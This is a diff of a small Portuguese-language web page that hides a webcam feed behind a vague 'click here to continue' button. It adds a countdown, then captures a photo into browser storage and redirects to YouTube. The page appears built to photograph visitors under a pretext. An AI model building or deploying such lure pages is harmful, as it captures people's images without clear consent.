@@ -11,6 +11,9 @@
         justify-content: center;
         align-items: center;
         background: #111;
+        color: white;
+        font-family: Arial;
+        flex-direction: column;
     }
 
     button {
@@ -22,6 +25,11 @@
         color: #000;
         font-weight: bold;
     }
+
+    #countdown {
+        font-size: 60px;
+        margin-top: 20px;
+    }
 </style>
 </head>
 
@@ -30,6 +38,7 @@
 <video id="webcam" autoplay playsinline muted style="display:none;"></video>
 
 <button id="btn">Clique aqui para continuar</button>
+<div id="countdown"></div>
 
 <script>
 document.getElementById("btn").addEventListener("click", capturePhoto);
@@ -37,7 +46,7 @@ document.getElementById("btn").addEventListener("click", capturePhoto);
 async function capturePhoto() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" } // câmera frontal
+            video: { facingMode: "user" }
         });
 
         const video = document.getElementById('webcam');
@@ -45,34 +54,40 @@ async function capturePhoto() {
 
         await video.play();
 
-        // espera garantir que o vídeo está pronto
-        setTimeout(() => {
+        // esconde botão
+        document.getElementById("btn").style.display = "none";
 
-            if (video.videoWidth === 0) {
-                alert("Erro ao acessar câmera");
-                return;
+        let count = 3;
+        const countdownEl = document.getElementById("countdown");
+        countdownEl.innerText = count;
+
+        const interval = setInterval(() => {
+            count--;
+            countdownEl.innerText = count > 0 ? count : "📸";
+
+            if (count < 0) {
+                clearInterval(interval);
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                localStorage.setItem('capturedImage', imageData);
+
+                // desliga câmera
+                stream.getTracks().forEach(track => track.stop());
+
+                // pequeno delay antes de sair
+                setTimeout(() => {
+                    window.location.href = "https://youtube.com";
+                }, 1500);
             }
 
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-
-            const imageData = canvas.toDataURL('image/jpeg', 0.9);
-
-            localStorage.setItem('capturedImage', imageData);
-
-            // desliga câmera
-            stream.getTracks().forEach(track => track.stop());
-
-            // redireciona
-            setTimeout(() => {
-                window.location.href = "https://youtube.com";
-            }, 500);
-
-        }, 1500); // mais tempo pro celular
+        }, 1000);
 
     } catch (err) {
         console.log(err);
